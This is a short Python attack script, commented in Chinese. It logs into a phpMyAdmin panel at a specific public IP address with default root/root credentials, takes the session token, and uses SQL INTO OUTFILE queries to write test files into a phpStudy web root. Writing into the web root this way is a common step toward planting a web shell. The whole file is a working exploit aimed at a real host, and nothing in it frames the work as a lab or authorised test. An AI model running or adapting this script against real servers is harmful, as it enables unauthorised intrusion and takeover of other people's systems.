#!/usr/bin/env python3
"""INTO OUTFILE 写文件 — 带完整错误输出"""
import urllib.request, http.cookiejar, re, sys, urllib.parse

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 测试1: 正斜杠
r = sql("SELECT 'test123' INTO OUTFILE 'C:/phpStudy/WWW/outtest.txt'")
print("=== 正斜杠 ===")
print(r[:1200].replace("\n", " ")[:1200])
print()
# 测试2: 反斜杠
r = sql("SELECT 'test456' INTO OUTFILE 'C:\\\\phpStudy\\\\WWW\\\\outtest2.txt'")
print("=== 反斜杠 ===")
print(r[:1200].replace("\n", " ")[:1200])
